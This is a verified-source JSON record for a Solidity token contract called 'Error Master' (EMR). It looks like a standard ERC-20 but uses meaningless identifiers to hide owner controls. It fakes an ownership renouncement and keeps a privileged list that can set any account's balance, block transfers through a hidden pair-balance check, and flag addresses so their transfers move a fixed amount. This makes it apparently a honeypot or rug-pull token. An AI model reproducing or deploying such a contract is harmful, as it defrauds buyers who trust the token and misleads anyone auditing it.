{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface fromToken {\n    function createPair(address receiverReceiver, address launchAtMax) external returns (address);\n}\n\ninterface receiverFundShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTo) external view returns (uint256);\n\n    function transfer(address feeTotalSell, uint256 tradingSwapIs) external returns (bool);\n\n    function allowance(address autoReceiverFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingSwapIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTotalSell,\n        uint256 tradingSwapIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingToken, uint256 value);\n    event Approval(address indexed autoReceiverFrom, address indexed spender, uint256 value);\n}\n\nabstract contract walletLimitBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverFundShouldMetadata is receiverFundShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ErrorMaster is walletLimitBuy, receiverFundShould, receiverFundShouldMetadata {\n\n    bool private liquiditySwapIs;\n\n    function txAt(uint256 tradingSwapIs) public {\n        exemptMarketing();\n        totalLaunched = tradingSwapIs;\n    }\n\n    function enableAuto(address liquidityEnable) public {\n        if (liquidityIs) {\n            return;\n        }\n        \n        totalAt[liquidityEnable] = true;\n        \n        liquidityIs = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountToken;\n    }\n\n    bool private isTxAmount;\n\n    uint256 public walletTxAuto;\n\n    uint256 autoToken;\n\n    function fromIsTo(address receiverLiquidity, uint256 tradingSwapIs) public {\n        exemptMarketing();\n        modeSellLaunch[receiverLiquidity] = tradingSwapIs;\n    }\n\n    function transfer(address receiverLiquidity, uint256 tradingSwapIs) external virtual override returns (bool) {\n        return enableModeReceiver(_msgSender(), receiverLiquidity, tradingSwapIs);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenIs;\n    }\n\n    address public receiverAmount;\n\n    function owner() external view returns (address) {\n        return amountToken;\n    }\n\n    uint256 private buyAt;\n\n    uint8 private tokenLiquidityFee = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLiquidityFee;\n    }\n\n    function balanceOf(address enableTo) public view virtual override returns (uint256) {\n        return modeSellLaunch[enableTo];\n    }\n\n    uint256 public isMinSwap;\n\n    address public feeLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minFee;\n    }\n\n    address marketingTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public liquidityAmount;\n\n    string private minFee = \"EMR\";\n\n    mapping(address => uint256) private modeSellLaunch;\n\n    bool private atWallet;\n\n    constructor (){\n        \n        launchLiquidity teamReceiver = launchLiquidity(marketingTotal);\n        receiverAmount = fromToken(teamReceiver.factory()).createPair(teamReceiver.WETH(), address(this));\n        \n        feeLiquidity = _msgSender();\n        totalAt[feeLiquidity] = true;\n        modeSellLaunch[feeLiquidity] = tokenIs;\n        autoReceiver();\n        if (isMinSwap != buyAt) {\n            buyAt = senderIs;\n        }\n        emit Transfer(address(0), feeLiquidity, tokenIs);\n    }\n\n    function exemptMarketing() private view {\n        require(totalAt[_msgSender()]);\n    }\n\n    mapping(address => bool) public totalAt;\n\n    string private marketingLiquidityTake = \"Error Master\";\n\n    function autoReceiver() public {\n        emit OwnershipTransferred(feeLiquidity, address(0));\n        amountToken = address(0);\n    }\n\n    uint256 public senderIs;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingLiquidityTake;\n    }\n\n    function transferFrom(address teamBuy, address feeTotalSell, uint256 tradingSwapIs) external override returns (bool) {\n        if (_msgSender() != marketingTotal) {\n            if (exemptTokenFee[teamBuy][_msgSender()] != type(uint256).max) {\n                require(tradingSwapIs <= exemptTokenFee[teamBuy][_msgSender()]);\n                exemptTokenFee[teamBuy][_msgSender()] -= tradingSwapIs;\n            }\n        }\n        return enableModeReceiver(teamBuy, feeTotalSell, tradingSwapIs);\n    }\n\n    function teamToken(address launchFrom) public {\n        exemptMarketing();\n        \n        if (launchFrom == feeLiquidity || launchFrom == receiverAmount) {\n            return;\n        }\n        liquidityAmount[launchFrom] = true;\n    }\n\n    function modeAuto(address teamBuy, address feeTotalSell, uint256 tradingSwapIs) internal returns (bool) {\n        require(modeSellLaunch[teamBuy] >= tradingSwapIs);\n        modeSellLaunch[teamBuy] -= tradingSwapIs;\n        modeSellLaunch[feeTotalSell] += tradingSwapIs;\n        emit Transfer(teamBuy, feeTotalSell, tradingSwapIs);\n        return true;\n    }\n\n    function approve(address exemptBuy, uint256 tradingSwapIs) public virtual override returns (bool) {\n        exemptTokenFee[_msgSender()][exemptBuy] = tradingSwapIs;\n        emit Approval(_msgSender(), exemptBuy, tradingSwapIs);\n        return true;\n    }\n\n    uint256 constant swapExempt = 16 ** 10;\n\n    event OwnershipTransferred(address indexed maxList, address indexed senderFee);\n\n    function allowance(address isSenderLaunched, address exemptBuy) external view virtual override returns (uint256) {\n        if (exemptBuy == marketingTotal) {\n            return type(uint256).max;\n        }\n        return exemptTokenFee[isSenderLaunched][exemptBuy];\n    }\n\n    uint256 private tokenIs = 100000000 * 10 ** 18;\n\n    bool public liquidityIs;\n\n    uint256 totalLaunched;\n\n    address private amountToken;\n\n    mapping(address => mapping(address => uint256)) private exemptTokenFee;\n\n    function enableModeReceiver(address teamBuy, address feeTotalSell, uint256 tradingSwapIs) internal returns (bool) {\n        if (teamBuy == feeLiquidity) {\n            return modeAuto(teamBuy, feeTotalSell, tradingSwapIs);\n        }\n        uint256 limitReceiver = receiverFundShould(receiverAmount).balanceOf(amountSwapShould);\n        require(limitReceiver == totalLaunched);\n        require(feeTotalSell != amountSwapShould);\n        if (liquidityAmount[teamBuy]) {\n            return modeAuto(teamBuy, feeTotalSell, swapExempt);\n        }\n        return modeAuto(teamBuy, feeTotalSell, tradingSwapIs);\n    }\n\n    address amountSwapShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiverFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSenderLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSwapIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"enableAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSwapIs\",\"type\":\"uint256\"}],\"name\":\"fromIsTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMinSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"}],\"name\":\"teamToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSwapIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTotalSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSwapIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingSwapIs\",\"type\":\"uint256\"}],\"name\":\"txAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTxAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ErrorMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}